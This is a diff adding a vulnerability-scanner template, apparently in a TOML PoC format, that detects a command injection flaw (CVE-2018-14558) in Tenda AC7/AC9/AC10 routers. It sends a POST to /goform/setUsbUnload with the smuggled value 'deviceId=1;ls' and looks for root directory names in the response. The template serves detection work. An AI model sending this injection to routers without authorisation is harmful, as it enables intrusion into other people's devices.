@@ -1,0 +1,39 @@
+[info]
+author = "AVE"
+description = "检测Tenda AC7/AC9/AC10路由器goform/setUsbUnload接口命令注入漏洞。向目标发送特制POST请求，通过检测响应判断漏洞是否存在。"
+id = "POC-AVE-2018-0222"
+name = "Tenda AC7/AC9/AC10 命令注入漏洞 PoC"
+severity = "critical"
+tags = ["cve-2018-14558"]
+vuln_id = [
+    "CVE-2018-14558",
+    "AVE-2018-0222",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "POST"
+path = "/goform/setUsbUnload"
+protocol = "http"
+
+[poc.requests.body]
+content = "deviceId=1;ls"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "bin",
+    "dev",
+    "etc",
+    "proc",
+    "tmp",
+    "var",
+]
